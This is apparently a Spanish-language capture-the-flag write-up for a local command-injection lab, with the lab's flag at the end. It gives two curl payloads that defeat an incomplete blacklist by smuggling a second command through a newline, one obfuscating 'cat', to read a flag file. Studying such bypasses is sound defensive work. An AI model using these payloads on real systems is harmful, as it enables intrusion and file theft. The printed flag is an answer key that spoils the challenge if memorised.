# IntraCorp CTF - Command Injection

## Detalles

- IntraCorp CTF Challenge 03 - OS Command Injection
- http://localhost:8003/

## Vulnerabilidad

- Command Injection en herramienta de ping
- Blacklist incompleta (bloquea `;`, `&`, `|`, `$`, `cat`)
- Flag en `/flag.txt`

## Inicio

```bash
docker-compose up -d challenge3
open http://localhost:8003/
```

## Writeup

### Bypass con newline (%0A) + comando alternativo

```bash
curl -X POST http://localhost:8003/tools/ping \
  --data "target=127.0.0.1%0Ahead%20/flag.txt"
```

### Bypass con ofuscación de cat

```bash
curl -X POST http://localhost:8003/tools/ping \
  --data "target=127.0.0.1%0Ac'a't%20/flag.txt"
```

## Flag

```
HACKCON{CMD1_BL4CKL1ST_BYP4SS}
```
